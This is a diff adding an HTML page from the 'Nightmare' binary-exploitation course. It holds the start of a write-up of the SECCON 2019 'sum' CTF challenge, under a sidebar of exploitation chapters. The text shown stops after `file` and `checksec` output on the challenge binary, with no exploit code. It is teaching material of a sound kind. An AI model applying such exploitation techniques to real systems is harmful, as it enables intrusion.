@@ -1,0 +1,1074 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js navy">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>SECCON&#x27;19: sum - Nightmare</title>
+        
+        
+
+
+        <!-- Custom HTML head -->
+        
+
+
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="Nightmare: an intro to binary exploitation / reverse engineering course based around CTF challenges.">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        
+        <link rel="icon" href="../../favicon.svg">
+        
+        
+        <link rel="shortcut icon" href="../../favicon.png">
+        
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+        
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        
+
+        
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "navy";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('navy')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../../index.html">Nightmare</a></li><li class="chapter-item expanded "><a href="../../00-intro/index.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../01-intro_assembly/assembly/index.html"><strong aria-hidden="true">1.1.</strong> Assembly</a></li><li class="chapter-item expanded "><a href="../../01-intro_assembly/reversing_assembly/index.html"><strong aria-hidden="true">1.2.</strong> Reversing Assembly</a></li><li class="chapter-item expanded "><a href="../../02-intro_tooling/ghidra/index.html"><strong aria-hidden="true">1.3.</strong> Reversing with GHIDRA</a></li><li class="chapter-item expanded "><a href="../../02-intro_tooling/gdb-gef/index.html"><strong aria-hidden="true">1.4.</strong> Debugging with GDB</a></li><li class="chapter-item expanded "><a href="../../02-intro_tooling/pwntools/index.html"><strong aria-hidden="true">1.5.</strong> Scripting with Python pwntools</a></li><li class="chapter-item expanded "><a href="../../03-beginner_re/csaw18_x86tour_pt1/index.html"><strong aria-hidden="true">1.6.</strong> Beginner Reversing</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../03-beginner_re/pico18_strings/index.html"><strong aria-hidden="true">1.6.1.</strong> Pico'18: Strings</a></li><li class="chapter-item expanded "><a href="../../03-beginner_re/helithumper_re/index.html"><strong aria-hidden="true">1.6.2.</strong> Helithumper RE</a></li><li class="chapter-item expanded "><a href="../../03-beginner_re/csaw19_beleaf/index.html"><strong aria-hidden="true">1.6.3.</strong> CSAW'19: Beleaf</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../../04-bof_variable/csaw18_boi/index.html"><strong aria-hidden="true">2.</strong> Stack Buffer Overflows</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../04-bof_variable/tamu19_pwn1/index.html"><strong aria-hidden="true">2.1.</strong> TAMU'19: Pwn1</a></li><li class="chapter-item expanded "><a href="../../04-bof_variable/tw17_justdoit/index.html"><strong aria-hidden="true">2.2.</strong> TokyoWesterns'17: JustDoIt</a></li><li class="chapter-item expanded "><a href="../../05-bof_callfunction/csaw16_warmup/index.html"><strong aria-hidden="true">2.3.</strong> CSAW'16: Warmup</a></li><li class="chapter-item expanded "><a href="../../05-bof_callfunction/csaw18_getit/index.html"><strong aria-hidden="true">2.4.</strong> CSAW'18: Getit</a></li><li class="chapter-item expanded "><a href="../../05-bof_callfunction/tu17_vulnchat/index.html"><strong aria-hidden="true">2.5.</strong> TU'17: Vulnchat</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../5.1-mitigation_aslr_pie/index.html"><strong aria-hidden="true">2.5.1.</strong> ASLR/PIE</a></li></ol></li><li class="chapter-item expanded "><a href="../../06-bof_shellcode/csaw17_pilot/index.html"><strong aria-hidden="true">2.6.</strong> CSAW'17: Pilot</a></li><li class="chapter-item expanded "><a href="../../06-bof_shellcode/tamu19_pwn3/index.html"><strong aria-hidden="true">2.7.</strong> TAMU'19: Pwn3</a></li><li class="chapter-item expanded "><a href="../../06-bof_shellcode/tu18_shellaeasy/index.html"><strong aria-hidden="true">2.8.</strong> TU'18: Shellaeasy</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../6.1-mitigation_nx/index.html"><strong aria-hidden="true">2.8.1.</strong> NX/XN/DEP</a></li></ol></li><li class="chapter-item expanded "><a href="../../07-bof_static/bkp16_simplecalc/index.html"><strong aria-hidden="true">2.9.</strong> BKP'16: SimpleCalc</a></li><li class="chapter-item expanded "><a href="../../07-bof_static/dcquals19_speedrun1/index.html"><strong aria-hidden="true">2.10.</strong> DCQuals'19: Speedrun1</a></li><li class="chapter-item expanded "><a href="../../07-bof_static/dcquals16_feedme/index.html"><strong aria-hidden="true">2.11.</strong> DCQuals'16: Feedme</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../7.1-mitigation_canary/index.html"><strong aria-hidden="true">2.11.1.</strong> Canaries/Cookies</a></li><li class="chapter-item expanded "><a href="../../7.2-mitigation_relro/index.html"><strong aria-hidden="true">2.11.2.</strong> RELRO</a></li></ol></li><li class="chapter-item expanded "><a href="../../08-bof_dynamic/csaw19_babyboi/index.html"><strong aria-hidden="true">2.12.</strong> CSAW'19: Babyboi</a></li><li class="chapter-item expanded "><a href="../../08-bof_dynamic/csawquals17_svc/index.html"><strong aria-hidden="true">2.13.</strong> CSAW Quals'17: SVC</a></li><li class="chapter-item expanded "><a href="../../08-bof_dynamic/fb19_overfloat/index.html"><strong aria-hidden="true">2.14.</strong> FB'19: Overfloat</a></li><li class="chapter-item expanded "><a href="../../08-bof_dynamic/hs19_storytime/index.html"><strong aria-hidden="true">2.15.</strong> HS'19: Storytime</a></li></ol></li><li class="chapter-item expanded "><a href="../../fmt.html"><strong aria-hidden="true">3.</strong> Format Strings</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../10-fmt_strings/backdoor17_bbpwn/index.html"><strong aria-hidden="true">3.1.</strong> Backdoor'17: bbpwn</a></li><li class="chapter-item expanded "><a href="../../10-fmt_strings/pico18_echo/index.html"><strong aria-hidden="true">3.2.</strong> PicoCTF'18: echo</a></li><li class="chapter-item expanded "><a href="../../10-fmt_strings/tw16_greeting/index.html"><strong aria-hidden="true">3.3.</strong> TokyoWesterns'16: Greeting</a></li></ol></li><li class="chapter-item expanded "><a href="../../indexing.html"><strong aria-hidden="true">4.</strong> Array Indexing</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../11-index/csaw18_doubletrouble/index.html"><strong aria-hidden="true">4.1.</strong> CSAW'18: DoubleTrouble</a></li><li class="chapter-item expanded "><a href="../../11-index/dcq16_xkcd/index.html"><strong aria-hidden="true">4.2.</strong> DCQ'16: XKCD</a></li><li class="chapter-item expanded "><a href="../../11-index/sunshinectf2017_alternatesolution/index.html"><strong aria-hidden="true">4.3.</strong> SunshineCTF'17: Alt. Solution</a></li><li class="chapter-item expanded "><a href="../../11-index/swampctf19_dreamheaps/index.html"><strong aria-hidden="true">4.4.</strong> SwampCTF'19: Dreamheaps</a></li></ol></li><li class="chapter-item expanded "><a href="../../randomness.html"><strong aria-hidden="true">5.</strong> Bad Seed</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../09-bad_seed/h3_time/index.html"><strong aria-hidden="true">5.1.</strong> H3: Time</a></li><li class="chapter-item expanded "><a href="../../09-bad_seed/hsctf19_tuxtalkshow/reamde.html"><strong aria-hidden="true">5.2.</strong> HSCTF'19: Tuxtalkshow</a></li><li class="chapter-item expanded "><a href="../../09-bad_seed/sunshinectf17_prepared/index.html"><strong aria-hidden="true">5.3.</strong> SunshineCTF'17: Prepared</a></li></ol></li><li class="chapter-item expanded "><a href="../../z3_angr.html"><strong aria-hidden="true">6.</strong> Z3 &amp; Symbolic Execution (angr)</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../12-z3/hs19_abyte/index.html"><strong aria-hidden="true">6.1.</strong> HS'19: abyte</a></li><li class="chapter-item expanded "><a href="../../12-z3/tokyowesterns17_revrevrev/index.html"><strong aria-hidden="true">6.2.</strong> TokyoWesterns'17: revrevrev</a></li><li class="chapter-item expanded "><a href="../../12-z3/tuctf_future/index.html"><strong aria-hidden="true">6.3.</strong> TUCTF: Future</a></li><li class="chapter-item expanded "><a href="../../13-angr/defcamp_r100/index.html"><strong aria-hidden="true">6.4.</strong> DEFCamp: r100</a></li><li class="chapter-item expanded "><a href="../../13-angr/plaid19_icancount/index.html"><strong aria-hidden="true">6.5.</strong> PlaidCTF'19: icancount</a></li><li class="chapter-item expanded "><a href="../../13-angr/securityfest_fairlight/index.html"><strong aria-hidden="true">6.6.</strong> SecurityFest Fairlight</a></li></ol></li><li class="chapter-item expanded "><a href="../../rop.html"><strong aria-hidden="true">7.</strong> Return Oriented Programming (ROP)</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../15-partial_overwrite/index.html"><strong aria-hidden="true">7.1.</strong> Partial Overwrite</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../15-partial_overwrite/hacklu15_stackstuff/index.html"><strong aria-hidden="true">7.1.1.</strong> Hack.lu'15: stackstuff</a></li><li class="chapter-item expanded "><a href="../../15-partial_overwrite/tamu19_pwn2/index.html"><strong aria-hidden="true">7.1.2.</strong> TAMU'19: pwn2</a></li><li class="chapter-item expanded "><a href="../../15-partial_overwrite/tuctf17_vulnchat2/index.html"><strong aria-hidden="true">7.1.3.</strong> TUCTF'17: vulnchat2</a></li></ol></li><li class="chapter-item expanded "><a href="../../17-stack_pivot/index.html"><strong aria-hidden="true">7.2.</strong> Stack Pivoting</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../17-stack_pivot/dcquals19_speedrun4/index.html"><strong aria-hidden="true">7.2.1.</strong> DCQuals'19: speedrun4</a></li><li class="chapter-item expanded "><a href="../../17-stack_pivot/insomnihack18_onewrite/index.html"><strong aria-hidden="true">7.2.2.</strong> Insomnihack'18: onewrite</a></li><li class="chapter-item expanded "><a href="../../17-stack_pivot/seccon19_sum/index.html" class="active"><strong aria-hidden="true">7.2.3.</strong> SECCON'19: sum</a></li><li class="chapter-item expanded "><a href="../../17-stack_pivot/xctf16_b0verflow/index.html"><strong aria-hidden="true">7.2.4.</strong> XCTF'16: b0verflow</a></li></ol></li><li class="chapter-item expanded "><a href="../../16-srop/index.html"><strong aria-hidden="true">7.3.</strong> SIGROP (SROP)</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../16-srop/backdoor_funsignals/index.html"><strong aria-hidden="true">7.3.1.</strong> BackdoorCTF: funsigals</a></li><li class="chapter-item expanded "><a href="../../16-srop/csaw19_smallboi/index.html"><strong aria-hidden="true">7.3.2.</strong> CSAW'19: smallboi</a></li><li class="chapter-item expanded "><a href="../../16-srop/inctf17_stupidrop/index.html"><strong aria-hidden="true">7.3.3.</strong> InCTF'17: stupidrop</a></li><li class="chapter-item expanded "><a href="../../16-srop/swamp19_syscaller/index.html"><strong aria-hidden="true">7.3.4.</strong> SwampCTF'19: syscaller</a></li></ol></li><li class="chapter-item expanded "><a href="../../18-ret2_csu_dl/index.html"><strong aria-hidden="true">7.4.</strong> ret2csu</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../18-ret2_csu_dl/0ctf18_babystack/index.html"><strong aria-hidden="true">7.4.1.</strong> 0CTF'18: babystack</a></li><li class="chapter-item expanded "><a href="../../18-ret2_csu_dl/ropemporium_ret2csu/index.html"><strong aria-hidden="true">7.4.2.</strong> ROPEmporium</a></li></ol></li><li class="chapter-item expanded "><a href="../../14-ret_2_system/index.html"><strong aria-hidden="true">7.5.</strong> ret2system</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../14-ret_2_system/asis17_marymorton/index.html"><strong aria-hidden="true">7.5.1.</strong> ASIS'17: marymorton</a></li><li class="chapter-item expanded "><a href="../../14-ret_2_system/hxp18_poorCanary/index.html"><strong aria-hidden="true">7.5.2.</strong> HXP'18: poorCanary</a></li><li class="chapter-item expanded "><a href="../../14-ret_2_system/tu_guestbook/index.html"><strong aria-hidden="true">7.5.3.</strong> TUCTF: guestbook</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../../25-heap/index.html"><strong aria-hidden="true">8.</strong> Heap Exploitation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../27-edit_free_chunk/double_free_explanation/index.html"><strong aria-hidden="true">8.1.</strong> Double Frees</a></li><li class="chapter-item expanded "><a href="../../27-edit_free_chunk/heap_consolidation_explanation/index.html"><strong aria-hidden="true">8.2.</strong> Heap Consolidation</a></li><li class="chapter-item expanded "><a href="../../27-edit_free_chunk/uaf_explanation/index.html"><strong aria-hidden="true">8.3.</strong> Use-after-Frees</a></li><li class="chapter-item expanded "><a href="../../24-heap_overflow/protostar_heap0/index.html"><strong aria-hidden="true">8.4.</strong> Protostar: heap0</a></li><li class="chapter-item expanded "><a href="../../24-heap_overflow/protostar_heap1/index.html"><strong aria-hidden="true">8.5.</strong> Protostar: heap1</a></li><li class="chapter-item expanded "><a href="../../24-heap_overflow/protostar_heap2/reamdme.html"><strong aria-hidden="true">8.6.</strong> Protostar: heap2</a></li><li class="chapter-item expanded "><a href="../../30-unlink/unlink_explanation/index.html"><strong aria-hidden="true">8.7.</strong> unlink() Exploitation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../30-unlink/hitcon14_stkof/index.html"><strong aria-hidden="true">8.7.1.</strong> HITCON'14: stkof</a></li><li class="chapter-item expanded "><a href="../../30-unlink/zctf16_note2/index.html"><strong aria-hidden="true">8.7.2.</strong> ZCTF'16: note2</a></li></ol></li><li class="chapter-item expanded "><a href="../../26-heap_grooming/explanation_heap_grooming/index.html"><strong aria-hidden="true">8.8.</strong> Heap Grooming</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../26-heap_grooming/pico_areyouroot/index.html"><strong aria-hidden="true">8.8.1.</strong> PicoCTF: areyouroot</a></li><li class="chapter-item expanded "><a href="../../26-heap_grooming/swamp19_heapgolf/index.html"><strong aria-hidden="true">8.8.2.</strong> SwampCTF'19: Heap Golf</a></li></ol></li><li class="chapter-item expanded "><a href="../../28-fastbin_attack/explanation_fastbinAttack/index.html"><strong aria-hidden="true">8.9.</strong> Fastbin Attack</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../28-fastbin_attack/0ctf_babyheap/index.html"><strong aria-hidden="true">8.9.1.</strong> 0CTF: babyheap</a></li><li class="chapter-item expanded "><a href="../../28-fastbin_attack/csaw17_auir/index.html"><strong aria-hidden="true">8.9.2.</strong> CSAW'17: Auir</a></li></ol></li><li class="chapter-item expanded "><a href="../../31-unsortedbin_attack/unsorted_explanation/index.html"><strong aria-hidden="true">8.10.</strong> Unsortedbin Attack</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../31-unsortedbin_attack/0ctf16_zerostorage/index.html"><strong aria-hidden="true">8.10.1.</strong> 0CTF'16: zerostorage</a></li><li class="chapter-item expanded "><a href="../../31-unsortedbin_attack/hitcon_magicheap/index.html"><strong aria-hidden="true">8.10.2.</strong> HITCON: magicheap</a></li></ol></li><li class="chapter-item expanded "><a href="../../32-largebin_attack/largebin_explanation0/index.html"><strong aria-hidden="true">8.11.</strong> Largebin Attack (part 1)</a></li><li class="chapter-item expanded "><a href="../../32-largebin_attack/largebin_explanation1/index.html"><strong aria-hidden="true">8.12.</strong> Largebin Attack (part 2)</a></li><li class="chapter-item expanded "><a href="../../29-tcache/tcache_explanation/index.html"><strong aria-hidden="true">8.13.</strong> GLibc Tcache</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../29-tcache/dcquals19_babyheap/index.html"><strong aria-hidden="true">8.13.1.</strong> DCQuals'19: babyheap</a></li><li class="chapter-item expanded "><a href="../../29-tcache/plaid19_cpp/index.html"><strong aria-hidden="true">8.13.2.</strong> PlaidCTF'19: cpp</a></li><li class="chapter-item expanded "><a href="../../44-more_tcache/csaw19_popping_caps0/index.html"><strong aria-hidden="true">8.13.3.</strong> CSAW'19: Popping Caps 1</a></li><li class="chapter-item expanded "><a href="../../44-more_tcache/csaw19_popping_caps1/index.html"><strong aria-hidden="true">8.13.4.</strong> CSAW'19: Popping Caps 2</a></li></ol></li><li class="chapter-item expanded "><a href="../../39-house_of_spirit/house_spirit_exp/index.html"><strong aria-hidden="true">8.14.</strong> House of Spirit</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../39-house_of_spirit/hacklu14_oreo/index.html"><strong aria-hidden="true">8.14.1.</strong> Hack.lu'14: Oreo</a></li></ol></li><li class="chapter-item expanded "><a href="../../40-house_of_lore/house_lore_exp/index.html"><strong aria-hidden="true">8.15.</strong> House of Lore</a></li><li class="chapter-item expanded "><a href="../../41-house_of_force/house_force_exp/index.html"><strong aria-hidden="true">8.16.</strong> House of Force</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../41-house_of_force/bkp16_cookbook/index.html"><strong aria-hidden="true">8.16.1.</strong> BKP'16: Cookbook</a></li></ol></li><li class="chapter-item expanded "><a href="../../42-house_of_einherjar/house_einherjar_exp/index.html"><strong aria-hidden="true">8.17.</strong> House of Einherjar</a></li><li class="chapter-item expanded "><a href="../../43-house_of_orange/house_orange_exp/index.html"><strong aria-hidden="true">8.18.</strong> House of Orange</a></li><li class="chapter-item expanded "><a href="../../33-custom_misc_heap/index.html"><strong aria-hidden="true">8.19.</strong> Miscellaneous</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../33-custom_misc_heap/csaw17_minesweeper/index.html"><strong aria-hidden="true">8.19.1.</strong> CSAW'17: Minesweeper</a></li><li class="chapter-item expanded "><a href="../../33-custom_misc_heap/csaw18_alienVSsamurai/index.html"><strong aria-hidden="true">8.19.2.</strong> CSAW'18: alienVSsamurai</a></li><li class="chapter-item expanded "><a href="../../33-custom_misc_heap/csaw19_traveller/index.html"><strong aria-hidden="true">8.19.3.</strong> CSAW'19: Traveller</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../../35-integer_exploitation/index.html"><strong aria-hidden="true">9.</strong> Integer Overflows</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../35-integer_exploitation/int_overflow_post/index.html"><strong aria-hidden="true">9.1.</strong> sploitFUN: vuln</a></li><li class="chapter-item expanded "><a href="../../35-integer_exploitation/puzzle/index.html"><strong aria-hidden="true">9.2.</strong> Puzzle</a></li><li class="chapter-item expanded "><a href="../../35-integer_exploitation/signed_unsigned/index.html"><strong aria-hidden="true">9.3.</strong> Signed vs. Unsigned</a></li></ol></li><li class="chapter-item expanded "><a href="../../37-fs_exploitation/index.html"><strong aria-hidden="true">10.</strong> FILE Exploitation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../37-fs_exploitation/swamp19_badfile/index.html"><strong aria-hidden="true">10.1.</strong> SwampCTF'19: Bad File</a></li></ol></li><li class="chapter-item expanded "><a href="../../grabbag.html"><strong aria-hidden="true">11.</strong> Grab Bag</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../19-shellcoding_pt1/index.html"><strong aria-hidden="true">11.1.</strong> Shellcoding</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../19-shellcoding_pt1/csaw18_shellpointcode/index.html"><strong aria-hidden="true">11.1.1.</strong> CSAW'18: Shellpointcode</a></li><li class="chapter-item expanded "><a href="../../19-shellcoding_pt1/defconquals19_s3/index.html"><strong aria-hidden="true">11.1.2.</strong> DCQuals'19: S3</a></li><li class="chapter-item expanded "><a href="../../19-shellcoding_pt1/defconquals19_s6/index.html"><strong aria-hidden="true">11.1.3.</strong> DCQuals'19: S6</a></li></ol></li><li class="chapter-item expanded "><a href="../../20-patching_and_jumping/index.html"><strong aria-hidden="true">11.2.</strong> Patching</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../20-patching_and_jumping/csawquals16_gametime/index.html"><strong aria-hidden="true">11.2.1.</strong> CSAW Quals'16: gametime</a></li><li class="chapter-item expanded "><a href="../../20-patching_and_jumping/dcquals18_elfcrumble/index.html"><strong aria-hidden="true">11.2.2.</strong> DCQuals'18: ELFCrumble</a></li><li class="chapter-item expanded "><a href="../../20-patching_and_jumping/plaid19_ppp/index.html"><strong aria-hidden="true">11.2.3.</strong> Plaid'19: PPP</a></li></ol></li><li class="chapter-item expanded "><a href="../../21-dot_net/index.html"><strong aria-hidden="true">11.3.</strong> .NET</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../21-dot_net/bikinibonanza/index.html"><strong aria-hidden="true">11.3.1.</strong> Bikinibonanza</a></li><li class="chapter-item expanded "><a href="../../21-dot_net/dot_net/index.html"><strong aria-hidden="true">11.3.2.</strong> CSAW'13: DotNetReversing</a></li><li class="chapter-item expanded "><a href="../../21-dot_net/whitehat18_re06/index.html"><strong aria-hidden="true">11.3.3.</strong> Whitehat'18: re06</a></li></ol></li><li class="chapter-item expanded "><a href="../../36-obfuscated_reversing/index.html"><strong aria-hidden="true">11.4.</strong> Obfuscation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../36-obfuscated_reversing/bkp16_unholy/index.html"><strong aria-hidden="true">11.4.1.</strong> BKP'16: Unholy</a></li><li class="chapter-item expanded "><a href="../../36-obfuscated_reversing/csaw15_wyvern/index.html"><strong aria-hidden="true">11.4.2.</strong> CSAW'15: Wyvern</a></li><li class="chapter-item expanded "><a href="../../36-obfuscated_reversing/csaw17_prophecy/index.html"><strong aria-hidden="true">11.4.3.</strong> CSAW'17: Prophecy</a></li><li class="chapter-item expanded "><a href="../../22-movfuscation/index.html"><strong aria-hidden="true">11.4.4.</strong> MOVfuscation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../22-movfuscation/asis18_babyc/index.html"><strong aria-hidden="true">11.4.4.1.</strong> ASIS'18: babyc</a></li><li class="chapter-item expanded "><a href="../../22-movfuscation/recon_movfuscated/index.html"><strong aria-hidden="true">11.4.4.2.</strong> RECON: movfuscated</a></li><li class="chapter-item expanded "><a href="../../22-movfuscation/swamp19_future/index.html"><strong aria-hidden="true">11.4.4.3.</strong> SwampCTF'19: Future Fun</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../../23-custom_architecture/index.html"><strong aria-hidden="true">11.5.</strong> Custom Architecture</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../23-custom_architecture/h3_h3machine0/index.html"><strong aria-hidden="true">11.5.1.</strong> H3Machine (part 1)</a></li><li class="chapter-item expanded "><a href="../../23-custom_architecture/h3_h3machine1/index.html"><strong aria-hidden="true">11.5.2.</strong> H3Machine (part 2)</a></li><li class="chapter-item expanded "><a href="../../23-custom_architecture/h3_h3machine2/index.html"><strong aria-hidden="true">11.5.3.</strong> H3Machine (part 3)</a></li><li class="chapter-item expanded "><a href="../../23-custom_architecture/h3_h3machine3/index.html"><strong aria-hidden="true">11.5.4.</strong> H3Machine (part 4)</a></li></ol></li><li class="chapter-item expanded "><a href="../../34-emulated_targets/index.html"><strong aria-hidden="true">11.6.</strong> Emulation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../34-emulated_targets/csaw15_hackingtime/index.html"><strong aria-hidden="true">11.6.1.</strong> CSAW'15: Hackingtime</a></li><li class="chapter-item expanded "><a href="../../34-emulated_targets/csaw17_realism/index.html"><strong aria-hidden="true">11.6.2.</strong> CSAW'17: Realism</a></li><li class="chapter-item expanded "><a href="../../34-emulated_targets/csaw18_x86_pt2/index.html"><strong aria-hidden="true">11.6.3.</strong> CSAW'18: x86 Pt.2</a></li></ol></li><li class="chapter-item expanded "><a href="../../38-grab_bad/uninit_vars/index.html"><strong aria-hidden="true">11.7.</strong> Uninitialized Variables</a></li><li class="chapter-item expanded "><a href="../../38-grab_bad/csaw18_doubletrouble/index.html"><strong aria-hidden="true">11.8.</strong> CSAW'18: Doubletrouble</a></li><li class="chapter-item expanded "><a href="../../38-grab_bad/csaw19_gibberishCheck/index.html"><strong aria-hidden="true">11.9.</strong> CSAW'19: Gibberishcheck</a></li><li class="chapter-item expanded "><a href="../../38-grab_bad/hackim19_shop/index.html"><strong aria-hidden="true">11.10.</strong> HackIM'19: Shop</a></li></ol></li><li class="chapter-item expanded "><a href="../../next/index.html">What's Next</a></li><li class="chapter-item expanded affix "><a href="../../references/index.html">References</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                        
+                    </div>
+
+                    <h1 class="menu-title">Nightmare</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                        
+                        <a href="https://github.com/guyinatuxedo/nightmare/" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+                        
+                    </div>
+                </div>
+
+                
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1><a class="header" href="#seccon-2019-quals-sum" id="seccon-2019-quals-sum">Seccon 2019 Quals Sum</a></h1>
+<p>Let's take a look at the binary and libc:</p>
+<pre><code>$    file sum_ccafa40ee6a5a675341787636292bf3c84d17264
+sum_ccafa40ee6a5a675341787636292bf3c84d17264: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=593a57775caa3028bd2ab72873bedaa36734cdb6, not stripped
+$    pwn checksec sum_ccafa40ee6a5a675341787636292bf3c84d17264
+[*] '/home/guyinatuxedo/Desktop/seccon/sum/sum_ccafa40ee6a5a675341787636292bf3c84d17264'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
